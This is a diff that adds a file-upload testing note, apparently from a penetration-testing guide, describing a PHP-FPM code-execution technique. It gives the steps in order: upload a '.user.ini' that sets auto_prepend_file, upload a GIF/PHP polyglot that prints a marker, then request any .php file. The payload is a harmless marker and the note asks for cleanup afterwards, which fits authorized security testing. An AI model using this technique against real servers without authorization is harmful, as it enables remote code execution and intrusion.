@@ -1,0 +1,23 @@
+# .user.ini PHP-FPM RCE primitive (FILE_UPLOAD_TESTING_GUIDE.md §10.3) — AUTHORIZED testing only.
+#
+# On PHP-FPM, a per-directory `.user.ini` is read for PHP_INI_PERDIR settings. `auto_prepend_file`
+# makes EVERY .php executed in that directory auto-include your file first. So if you can upload
+# `.user.ini` + a benign-marker include into the upload dir, and any .php is reachable there (or the
+# dir serves .php), you get code execution — without uploading a .php yourself.
+#
+# STEP 1 — upload this as ".user.ini" into the target's upload directory:
+# ------------------------------------------------------------------------
+auto_prepend_file=shell.gif
+# ------------------------------------------------------------------------
+#
+# STEP 2 — upload "shell.gif" (a benign-marker polyglot) into the SAME directory:
+#   GIF89a;<?php echo "RCE-POC-".md5("yourhandle-unique")."-".php_uname(); ?>
+#   (make it with: printf 'GIF89a;\n<?php echo "RCE-POC-".md5("poc")."-".php_uname(); ?>\n' > shell.gif )
+#
+# STEP 3 — request ANY .php in that directory (or trigger one). The prepend fires and you see:
+#   RCE-POC-<hash>-<hostname>   → proven Critical RCE.
+#
+# NOTES:
+#  - `.user.ini` is rarely on extension denylists (test it even when .php/.htaccess are blocked).
+#  - Takes effect on the next PHP request after the FPM `user_ini.cache_ttl` (default 300s) — be patient.
+#  - Keep the include BENIGN (a marker, not a backdoor). DELETE both files after. (guide §26)
